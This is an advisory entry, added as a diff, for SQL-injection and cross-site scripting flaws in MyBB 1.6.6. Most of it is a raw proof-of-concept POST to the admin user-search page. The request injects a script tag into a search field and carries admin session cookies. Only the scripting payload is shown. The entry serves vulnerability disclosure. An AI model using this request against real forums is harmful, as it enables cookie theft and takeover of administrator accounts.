@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/52743/info
+ 
+MyBB is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability.
+ 
+Exploiting these vulnerabilities could allow an attacker to execute arbitrary script code, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+ 
+MyBB 1.6.6 is vulnerable; other versions may also be affected. 
+
+POST /mybb/admin/index.php?module=user-users&action=search HTTP/1.1
+Host: 192.168.7.5
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:10.0) Gecko/20100101 Firefox/10.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.7.5/mybb/admin/index.php?module=user-users&action=search
+Cookie: mybb[lastvisit]=1332694756; mybb[lastactive]=1332699650; mybb[referrer]=1; loginattempts=1; 
+adminsid=a82d27dd72efdb0a99c009db7701e847; acploginattempts=0; mybbuser=1_CAo7pz2wUvHGtlJht9OLGyXG8ZVbS78xAXx6ZTzBrvNSe5S2GM; 
+sid=d725ac10b7d8f0f8765dfa73f5dcf23b
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 638
+
+my_post_key=5dbe489b5b03d9d9e2d387ff9267567d&conditions%5Busername%5D=aditya&conditions%5Bemail%5D=aditya
+&conditions%5Busergroup%5D%5B%5D=2<script>document.write(Date())</script>&conditions%5Bwebsite%5D=&conditions%5Bicq%5D=
+&conditions%5Baim%5D=&conditions%5Byahoo%5D=&conditions%5Bmsn%5D=&conditions%5Bsignature%5D=&conditions%5Busertitle%5D=
+&conditions%5Bpostnum_dir%5D=greater_than&conditions%5Bpostnum%5D=&conditions%5Bregdate%5D=
+&conditions%5Bregip%5D=&conditions%5Blastip%5D=&conditions%5Bpostip%5D=&profile_fields%5Bfid3%5D%5Bfid3%5D=N%2FA
+&profile_fields%5Bfid1%5D=&profile_fields%5Bfid2%5D=&sortby=username&order=asc&perpage=&displayas=card
